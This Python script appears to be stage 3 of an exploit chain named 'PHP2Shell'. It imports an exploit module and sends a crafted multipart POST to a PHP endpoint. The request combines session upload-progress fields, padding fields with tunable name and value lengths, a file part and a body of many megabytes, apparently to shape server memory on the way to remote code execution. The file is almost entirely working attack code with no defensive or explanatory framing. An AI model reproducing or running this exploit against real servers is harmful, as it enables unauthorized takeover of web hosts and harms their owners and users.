#!/usr/bin/env python3
"""Send request A for PHP2Shell stage 3."""

import argparse

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--huge-mb", type=int, default=12)
    parser.add_argument("--timeout", type=float, default=90.0)
    parser.add_argument("--no-cookie", action="store_true")
    parser.add_argument("--sid-len", type=int, default=19)
    parser.add_argument("--progress-len", type=int, default=3)
    parser.add_argument("--filename-len", type=int, default=5)
    parser.add_argument(
        "--pads",
        default="31:31,31:31,31:31,31:31,31:31,31:31",
        help="comma-separated name-length:value-length pad specifications",
    )
    args = parser.parse_args()
    target = exploit.Target(args.url, timeout=args.timeout, verbose=True)
    parts = [
        {"name": "PHPSESSID", "data": b"a" * args.sid_len},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * args.progress_len},
    ]
    pad_specs = []
    for item in args.pads.split(","):
        if not item:
            continue
        name_len, value_len = (int(part) for part in item.split(":", 1))
        pad_specs.append((name_len, value_len))
    for i, (name_len, value_len) in enumerate(pad_specs):
        parts.append(
            {
                "name": (f"p{i:0{name_len - 1}d}" if name_len else "")[:name_len],
                "data": b"V" * value_len,
            }
        )
    parts += [
        {"name": "f", "filename": "a" * args.filename_len, "data": b"A" * 64},
        {"name": "big", "data": b"B" * (args.huge_mb * 1024 * 1024)},
    ]
    extra_headers = None
    if not args.no_cookie:
        extra_headers = {"Cookie": "PHPSESSID=" + "a" * 32}
    target.post(
        exploit.build_multipart(parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=args.timeout,
        extra_headers=extra_headers,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
